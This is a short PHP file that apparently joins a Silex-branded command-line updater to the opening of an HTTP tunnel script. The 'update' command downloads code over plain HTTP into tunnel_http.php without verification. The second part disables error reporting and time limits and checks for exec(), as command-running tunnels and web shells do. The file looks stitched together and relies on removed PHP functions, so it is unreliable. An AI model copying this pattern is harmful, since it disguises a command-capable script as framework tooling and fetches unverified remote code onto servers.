<?php
if ('cli' === php_sapi_name() && basename(__FILE__) === $argv[0] && isset($argv[1])) {
    switch ($argv[1]) {
        case 'update':
            $remoteFilename = 'http://silex-project.org/get/tunnel_http.php';
            $localFilename = __DIR__.'/tunnel_http.php';

            file_put_contents($localFilename, file_get_contents($remoteFilename));
            break;

        case 'check':
            $latest = trim(file_get_contents('http://silex-project.org/get/version'));

            if ($latest != Silex\Application::VERSION) {
                printf("A newer Silex version is available (%s).\n", $latest);
            } else {
                print("You are using the latest Silex version.\n");
            }
            break;

        case 'version':
            printf("Silex version %s\n", Silex\Application::VERSION);
            break;

        default:
            printf("Unknown command '%s' (available commands: version, check, and update).\n", $argv[1]);
    }

    exit(0);
}

header("Content-Type: application/octet-stream");

error_reporting(0);
set_time_limit(0);
set_magic_quotes_runtime(0);

function phpversion_int()
{
    list($maVer, $miVer, $edVer) = split("[/.-]", phpversion());
    return $maVer*10000 + $miVer*100 + $edVer;
}

function CheckFunctions()
{
    if (!function_exists("exec"))
        return "exec";
    return "";
}